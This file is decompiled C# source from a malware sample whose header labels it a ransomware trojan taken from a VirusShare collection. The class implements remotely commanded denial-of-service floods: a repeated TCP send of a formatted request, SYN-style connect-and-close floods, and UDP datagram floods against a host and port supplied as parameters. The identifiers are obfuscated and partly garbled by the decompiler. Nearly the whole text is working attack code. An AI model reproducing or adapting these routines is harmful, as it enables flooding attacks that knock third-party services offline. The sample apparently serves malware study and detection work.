// Decompiled with JetBrains decompiler
// Type: *p.A
.t.^%N}e
// Assembly: System, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DB18CA19-4EF7-467A-AA02-244B3B1B157A
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00070-msil\VHO-Trojan-Ransom.Win32.Convagent.gen-fe2473ff7e7507e98adf2d055102064f9ebc133096f412e3944dd0dbee2345d7.exe

using \u002Ap\u000C.\u0019A\u0013\u001C\u000A\u000B.\u0016t;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace \u002Ap\u000C.\u0019A\u0013\u001C\u000A\u000B.\u0016t
{
  internal class \u005E\u0025\u0002N\u007D\u0003e
  {
    public static List<BackgroundWorker>  = new List<BackgroundWorker>();
    private static IPEndPoint B\u003C\u0006BL\u000F;
    private static \u005E\u0025\u0002N\u007D\u0003e.i\u0010\u001A \u0010V\u0023\u002D\u0019O0\u008F;
    private static byte[] \u0034\u0002\u0011\u00180\u0015F;

    public static bool \u0018\u007D\u0024\u0025D\u0015\u000F\u0085(
      \u0001\u0011.\u002F\u0018\u0005 _param0,
      string[] _param1)
    {
      try
      {
        string str = Convert.ToString(_param1[1]);
        ushort port = ushort.Parse(_param1[2]);
        switch (_param0)
        {
          case \u0001\u0011.\u002F\u0018\u0005.\u003F\u0004\u003Ek:
            \u005E\u0025\u0002N\u007D\u0003e.\u0034\u0002\u0011\u00180\u0015F = Encoding.ASCII.GetBytes(string.Format(\u003CPrivateImplementationDetails\u003E\u007BF5B49754\u002D4EB9\u002D4C00\u002DBB11\u002D3C96CAB5A910\u007D.\u002F\u005E(), (object) Convert.ToString(_param1[3]), (object) str, (object) Environment.NewLine));
            \u005E\u0025\u0002N\u007D\u0003e.\u0010V\u0023\u002D\u0019O0\u008F = new \u005E\u0025\u0002N\u007D\u0003e.i\u0010\u001A(\u005E\u0025\u0002N\u007D\u0003e.\u0087\u0023X3Q\u0027\u0017);
            break;
          case \u0001\u0011.\u002F\u0018\u0005.\u0018\u000B:
            \u005E\u0025\u0002N\u007D\u0003e.\u0034\u0002\u0011\u00180\u0015F = (byte[]) null;
            \u005E\u0025\u0002N\u007D\u0003e.\u0010V\u0023\u002D\u0019O0\u008F = new \u005E\u0025\u0002N\u007D\u0003e.i\u0010\u001A(\u005E\u0025\u0002N\u007D\u0003e.R\u0019);
            break;
          case \u0001\u0011.\u002F\u0018\u0005.\u001C\u0012\u003B\u000C\u0017:
            \u005E\u0025\u0002N\u007D\u0003e.\u0034\u0002\u0011\u00180\u0015F = new byte[Convert.ToInt32(_param1[3])];
            \u005E\u0025\u0002N\u007D\u0003e.\u0010V\u0023\u002D\u0019O0\u008F = new \u005E\u0025\u0002N\u007D\u0003e.i\u0010\u001A(\u005E\u0025\u0002N\u007D\u0003e.lr\u001C\u000E);
            break;
        }
        try
        {
          \u005E\u0025\u0002N\u007D\u0003e.B\u003C\u0006BL\u000F = new IPEndPoint(Dns.GetHostEntry(str).AddressList[0], (int) port);
        }
        catch
        {
          \u005E\u0025\u0002N\u007D\u0003e.B\u003C\u0006BL\u000F = new IPEndPoint(IPAddress.Parse(str), (int) port);
        }
        \u005E\u0025\u0002N\u007D\u0003e.U\u0024J\u001F\u0022\u001E\u0020();
      }
      catch
      {
        return false;
      }
      return true;
    }

    public static void U\u0024J\u001F\u0022\u001E\u0020()
    {
      BackgroundWorker backgroundWorker = new BackgroundWorker();
      backgroundWorker.DoWork += new DoWorkEventHandler(\u005E\u0025\u0002N\u007D\u0003e.\u0010V\u0023\u002D\u0019O0\u008F.Invoke);
      backgroundWorker.WorkerSupportsCancellation = true;
      backgroundWorker.RunWorkerAsync();
      \u005E\u0025\u0002N\u007D\u0003e..Add(backgroundWorker);
    }

    public static void \u000E\u0007\u008E\u00169()
    {
      if (\u005E\u0025\u0002N\u007D\u0003e..Count <= 0)
        return;
      \u005E\u0025\u0002N\u007D\u0003e.[0].CancelAsync();
      \u005E\u0025\u0002N\u007D\u0003e..RemoveAt(0);
    }

    private static void WR(IAsyncResult _param0)
    {
    }

    private static void \u0087\u0023X3Q\u0027\u0017(object _param0, DoWorkEventArgs _param1)
    {
      while (!(_param0 as BackgroundWorker).CancellationPending)
      {
        try
        {
          Socket socket = new Socket(\u005E\u0025\u0002N\u007D\u0003e.B\u003C\u0006BL\u000F.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
          try
          {
            socket.Connect((EndPoint) \u005E\u0025\u0002N\u007D\u0003e.B\u003C\u0006BL\u000F);
          }
          catch
          {
            continue;
          }
          socket.Blocking = false;
          socket.Send(\u005E\u0025\u0002N\u007D\u0003e.\u0034\u0002\u0011\u00180\u0015F, SocketFlags.None);
        }
        catch
        {
        }
        Thread.Sleep(15);
      }
    }

    private static void R\u0019(object _param0, DoWorkEventArgs _param1)
    {
      while (!(_param0 as BackgroundWorker).CancellationPending)
      {
        try
        {
          Socket state = new Socket(\u005E\u0025\u0002N\u007D\u0003e.B\u003C\u0006BL\u000F.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
          state.BeginConnect((EndPoint) \u005E\u0025\u0002N\u007D\u0003e.B\u003C\u0006BL\u000F, new AsyncCallback(\u005E\u0025\u0002N\u007D\u0003e.WR), (object) state);
          state.Blocking = false;
          state.Close();
        }
        catch
        {
        }
        Thread.Sleep(15);
      }
    }

    private static void lr\u001C\u000E(object _param0, DoWorkEventArgs _param1)
    {
      Socket socket = new Socket(\u005E\u0025\u0002N\u007D\u0003e.B\u003C\u0006BL\u000F.AddressFamily, SocketType.Dgram, ProtocolType.Udp);
      socket.Blocking = false;
      while (!(_param0 as BackgroundWorker).CancellationPending)
      {
        try
        {
          socket.SendTo(\u005E\u0025\u0002N\u007D\u0003e.\u0034\u0002\u0011\u00180\u0015F, (EndPoint) \u005E\u0025\u0002N\u007D\u0003e.B\u003C\u0006BL\u000F);
        }
        catch
        {
        }
        Thread.Sleep(20);
      }
    }

    private delegate void i\u0010\u001A(object _param1, DoWorkEventArgs _param2);
  }
}
